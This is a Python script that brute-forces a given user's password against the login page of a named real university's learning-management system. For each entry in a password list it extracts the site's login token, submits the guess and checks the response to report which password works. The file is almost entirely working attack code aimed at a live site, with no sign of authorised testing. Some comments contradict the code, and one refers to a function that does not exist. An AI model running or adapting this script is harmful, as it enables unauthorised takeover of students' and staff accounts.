#!./.venv/bin/python
# Python script to find users who still have the default password (as an argument)

import requests
from bs4 import BeautifulSoup


import sys


LOGIN_URL = "https://lms.snuchennai.edu.in/login/index.php"

# Predefined message displayed when login successful and credentials incorrect
# May change in future
WELCOME_MSG = "Welcome to the Learning Management System (LMS) at Shiv Nadar University, Chennai !!"
ERROR_MSG = "Invalid login, please try again"


def logUnknownError(password, html):
    with open(password, "w+") as file:
        file.write(html)


def checkLogin(response):
    soup = BeautifulSoup(response.text, "html.parser")

    # Check if welcome message is in content
    if WELCOME_MSG == str(soup.p.contents[0].text):  # type:ignore
        return True
    # Check if error message is in alert (id) box
    elif ERROR_MSG == soup.body.select_one(".alert").text:  # type:ignore
        return False
    # Raise exception if something unexpected happens
    else:
        raise Exception("Unknown error")


def login(session, username, password):
    # Get login token from page
    login_token = BeautifulSoup(session.get(LOGIN_URL).text, "html.parser").find(
        "input",
        {"name": "logintoken"},  # type:ignore
    )["value"]

    # default login payloads
    data = {
        "anchor": "",
        "logintoken": login_token,
        "username": username,
        "password": password,
    }

    response = session.post(LOGIN_URL, data=data)

    return response


# TODO: Return password list as list
def getPasswords(filename="passlist.txt"):
    passlist = []
    with open(filename, "r") as file:
        for line in file:
            passlist.append(line.strip())

    return passlist


def main():
    # Abort if username is not provided as an argument
    try:
        username = sys.argv[1]
    except IndexError:
        print("Provide username as an argument")
        return

    # Iterate over each username in the list (csv)
    for password in getPasswords():
        # Create a new session for each user
        with requests.session() as session:
            loginResponse = login(session, username, password)

        try:
            status = checkLogin(loginResponse)

            # If login success, call addReport function and report in stdout
            if status:
                print(f"{password} works for {username}")

            # If login failed, report in stdout
            else:
                print(f"Password: {password} failed")

        # Dump returned HTML in case of unexpected error
        except Exception:
            print(f"Exception occured for ${password}")
            logUnknownError(username, loginResponse.text)


if __name__ == "__main__":
    main()
